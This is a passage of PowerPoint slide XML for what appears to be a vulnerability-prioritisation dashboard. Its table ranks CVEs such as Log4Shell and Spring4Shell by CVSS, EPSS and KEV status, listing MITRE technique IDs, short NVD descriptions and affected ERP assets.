        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Confirmed wild exploits</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4983480" y="2148840"/>
            <a:ext cx="228600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3208" y="2240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EPSS &gt; 90%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="TextBox 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="TextBox 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5093208" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Near-certain exploitation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Rectangle 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7360920" y="2148840"/>
            <a:ext cx="2286000" cy="749808"/>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2148840"/>
            <a:ext cx="228600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2240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EPSS 20–60%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="TextBox 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7470648" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Monitor and prepare</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9738360" y="2148840"/>
            <a:ext cx="2194560" cy="749808"/>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38360" y="2148840"/>
            <a:ext cx="219456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8088" y="2240280"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NVD Sync</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2423160"/>
            <a:ext cx="1975104" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Jan 14</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9848088" y="2679192"/>
            <a:ext cx="1975104" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>All feeds current</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="299008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26664"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Intelligence Feed — Ranked by Exploit Priority (EPSS × KEV × CVSS)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3264408"/>
            <a:ext cx="1202436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10128"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE ID</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="TextBox 37"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="3310128"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="3310128"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EPSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="3310128"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>KEV</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="TextBox 40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="3310128"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITRE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="TextBox 41"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="3310128"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NVD DESCRIPTION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="TextBox 42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="3310128"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="650" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AFFECTED ASSET</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Rectangle 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3520440"/>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2608" y="3557016"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2021-44228</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="TextBox 45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="3557016"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="TextBox 46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="3557016"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>97.5%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="TextBox 47"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="3557016"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="TextBox 48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="3557016"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1190 · T1059 · T1027</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="50" name="TextBox 49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="3557016"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Apache Log4j2 JNDI injection via user-supplied data leads to remote code execution</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="TextBox 50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="3557016"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ERPNext / Log4j 2.14</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="Rectangle 51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="3767328"/>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92608" y="3803904"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-22965</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="TextBox 53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="3803904"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>9.8</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="TextBox 54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="3803904"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>97.2%</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="56" name="TextBox 55"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2898648" y="3803904"/>
            <a:ext cx="411480" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="TextBox 56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3401568" y="3803904"/>
            <a:ext cx="1691640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>T1190 · T1059.007</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="58" name="TextBox 57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5184648" y="3803904"/>
            <a:ext cx="4800600" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spring MVC data binding on JDK9+ allows RCE via ClassLoader manipulation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="59" name="TextBox 58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10076688" y="3803904"/>
            <a:ext cx="2148840" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Spring ERP Backend</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Rectangle 59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4014216"/>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92608" y="4050792"/>
            <a:ext cx="1325880" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-0543</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="TextBox 61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1709928" y="4050792"/>
            <a:ext cx="502920" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="F87171"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10.0</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="TextBox 62"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2304288" y="4050792"/>
            <a:ext cx="502920" cy="182880"/>
